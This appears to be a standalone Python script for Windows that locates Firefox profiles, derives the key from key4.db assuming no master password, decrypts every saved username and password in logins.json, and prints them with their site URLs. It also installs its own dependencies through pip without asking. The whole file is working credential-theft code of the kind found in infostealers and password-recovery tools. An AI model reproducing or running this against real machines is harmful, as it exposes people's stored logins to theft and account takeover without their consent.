import subprocess
import importlib
import sys

required_modules = ['pyasn1', 'Crypto']

def install_missing_modules(modules):
    for module in modules:
        try:
            importlib.import_module(module)
        except ImportError:
            print(f"{module} is not installed. Installing...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", module])

install_missing_modules(required_modules)

import os
import json
import sqlite3
import struct
import traceback
import hmac
import base64
import time
from hashlib import sha1, pbkdf2_hmac
from pyasn1.codec.der import decoder
from binascii import unhexlify
from Crypto.Cipher import AES, DES3
from Crypto.Util.Padding import unpad
from configparser import RawConfigParser

# Constants
CKA_ID = unhexlify('f8000000000000000000000000000001')
AES_BLOCK_SIZE = 16

def convert_to_byte(s):
    """Convert string to bytes if needed"""
    if isinstance(s, str):
        return s.encode('utf-8')
    return s

def remove_padding(data):
    """Remove PKCS#7 padding"""
    try:
        nb = struct.unpack('B', data[-1])[0]  # Python 2
    except Exception:
        nb = data[-1]  # Python 3

    try:
        return data[:-nb]
    except Exception:
        print(traceback.format_exc())
        return data

def get_firefox_profiles(path):
    """Get Firefox profiles from profiles.ini"""
    profiles = []
    profiles_ini = os.path.join(path, 'profiles.ini')
    
    if os.path.exists(profiles_ini):
        cp = RawConfigParser()
        cp.read(profiles_ini)
        
        for section in cp.sections():
            if section.startswith('Profile') and cp.has_option(section, 'Path'):
                profile_path = None
                
                if cp.has_option(section, 'IsRelative'):
                    if cp.get(section, 'IsRelative') == '1':
                        profile_path = os.path.join(path, cp.get(section, 'Path').strip())
                    elif cp.get(section, 'IsRelative') == '0':
                        profile_path = cp.get(section, 'Path').strip()
                else:
                    profile_path = os.path.join(path, cp.get(section, 'Path').strip())
                
                if profile_path:
                    profile_path = profile_path.replace('/', '\\')
                    if os.path.exists(profile_path):
                        profiles.append(profile_path)
    else:
        pass
    return profiles

def get_key(profile):
    """Get main key used to encrypt all data"""
    try:
        # Try key4.db first (newer Firefox versions)
        key_db = os.path.join(profile, 'key4.db')
        if not os.path.exists(key_db):
            return None

        # Check if file is empty
        with open(key_db, 'rb') as f:
            content = f.read()
            if not content:
                return None
        
        conn = sqlite3.connect(key_db)
        c = conn.cursor()
        
        # Get password metadata
        c.execute("SELECT item1,item2 FROM metaData WHERE id = 'password';")
        try:
            row = next(c)
        except:
            return None
            
        if not row:
            return None
            
        global_salt = row[0]
        item2 = row[1]
        decoded_item2 = decoder.decode(item2)
        
        # Get the encrypted key from nssPrivate
        c.execute("SELECT a11,a102 FROM nssPrivate;")
        for row in c:
            if row[0]:
                break
                
        if not row:
            return None
            
        a11 = row[0]  # CKA_VALUE
        a102 = row[1]  # CKA_ID
        
        if a102 == CKA_ID:
            decoded_a11 = decoder.decode(a11)
            key = decrypt_3des(decoded_a11, b'', global_salt)
            if key:
                return key[:24]
        else:
            pass
            
    except Exception as e:
        print(traceback.format_exc())
    finally:
        try:
            conn.close()
        except:
            pass
            
    return None

def decrypt_3des(decoded_item, master_password, global_salt):
    """Decrypt 3DES key"""
    pbeAlgo = str(decoded_item[0][0][0])
    
    if pbeAlgo == '1.2.840.113549.1.12.5.1.3':  # pbeWithSha1AndTripleDES-CBC
        entry_salt = decoded_item[0][0][1][0].asOctets()
        cipher_t = decoded_item[0][1].asOctets()

        hp = sha1(global_salt + master_password).digest()
        pes = entry_salt + b'\x00' * (20 - len(entry_salt))
        chp = sha1(hp + entry_salt).digest()
        k1 = hmac.new(chp, pes + entry_salt, sha1).digest()
        tk = hmac.new(chp, pes, sha1).digest()
        k2 = hmac.new(chp, tk + entry_salt, sha1).digest()
        k = k1 + k2
        iv = k[-8:]
        key = k[:24]
        
        cipher = DES3.new(key, DES3.MODE_CBC, iv)
        return cipher.decrypt(cipher_t)
    
    elif pbeAlgo == '1.2.840.113549.1.5.13':  # pkcs5 pbes2
        assert str(decoded_item[0][0][1][0][0]) == '1.2.840.113549.1.5.12'
        assert str(decoded_item[0][0][1][0][1][3][0]) == '1.2.840.113549.2.9'
        assert str(decoded_item[0][0][1][1][0]) == '2.16.840.1.101.3.4.1.42'
        
        entry_salt = decoded_item[0][0][1][0][1][0].asOctets()
        iteration_count = int(decoded_item[0][0][1][0][1][1])
        key_length = int(decoded_item[0][0][1][0][1][2])
        assert key_length == 32

        k = sha1(global_salt + master_password).digest()
        key = pbkdf2_hmac('sha256', k, entry_salt, iteration_count, dklen=key_length)

        iv = b'\x04\x0e' + decoded_item[0][0][1][1][1].asOctets()
        encrypted_value = decoded_item[0][1].asOctets()
        
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        cleartxt = b"".join([cipher.decrypt(encrypted_value[i:i + AES_BLOCK_SIZE])
                         for i in range(0, len(encrypted_value), AES_BLOCK_SIZE)])
        
        return cleartxt[:-cleartxt[-1]]

def decode_login_data(data):
    """Decode login data from base64 and ASN.1"""
    try:
        asn1data = decoder.decode(base64.b64decode(data))
        # For login and password, keep :(key_id, iv, ciphertext)
        return asn1data[0][0].asOctets(), asn1data[0][1][1].asOctets(), asn1data[0][2].asOctets()
    except Exception as e:
        print(traceback.format_exc())
        return None, None, None

def get_login_data(profile):
    """Get encrypted login data from logins.json"""
    logins = []
    try:
        logins_json = os.path.join(profile, 'logins.json')
        if os.path.isfile(logins_json):
            with open(logins_json) as f:
                loginf = f.read()
                if loginf:
                    json_logins = json.loads(loginf)
                    if 'logins' in json_logins:
                        for row in json_logins['logins']:
                            try:
                                enc_username = row['encryptedUsername']
                                enc_password = row['encryptedPassword']
                                decoded_username = decode_login_data(enc_username)
                                decoded_password = decode_login_data(enc_password)
                                if decoded_username and decoded_password:
                                    logins.append((decoded_username, decoded_password, row['hostname']))
                            except Exception as e:
                                continue
                    else:
                        pass
                else:
                    pass
        else:
            pass
    except Exception:
        print(traceback.format_exc())
    
    return logins

def decrypt(key, iv, ciphertext):
    """Decrypt ciphered data using 3DES"""
    try:
        cipher = DES3.new(key, DES3.MODE_CBC, iv)
        data = cipher.decrypt(ciphertext)
        return data[:-data[-1]]
    except Exception as e:
        print(traceback.format_exc())
        return b''

def main():
    # Firefox profile path
    firefox_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox')

    if not os.path.exists(firefox_path):
        return

    # Get all Firefox profiles
    profiles = get_firefox_profiles(firefox_path)
    if not profiles:
        return

    # Process each profile
    for profile in profiles:
        # Get the encryption key
        key = get_key(profile)
        if not key:
            continue
        # Get login data
        credentials = get_login_data(profile)
        if not credentials:
            continue

        # Decrypt and print credentials
        for i, (user, passw, url) in enumerate(credentials):
            try:
                print(f"URL: {url}")                
                username = decrypt(key=key, iv=user[1], ciphertext=user[2])                
                password = decrypt(key=key, iv=passw[1], ciphertext=passw[2])
                
                if username and password:
                    try:
                        username_str = username.decode('utf-8', errors='ignore')
                        password_str = password.decode('utf-8', errors='ignore')
                        print(f"Username: {username_str}")
                        print(f"Password: {password_str}")
                        print("")
                    except Exception as e:
                        pass
                else:
                    pass
            except Exception as e:
                print(traceback.format_exc())

if __name__ == '__main__':
    main()
    input("")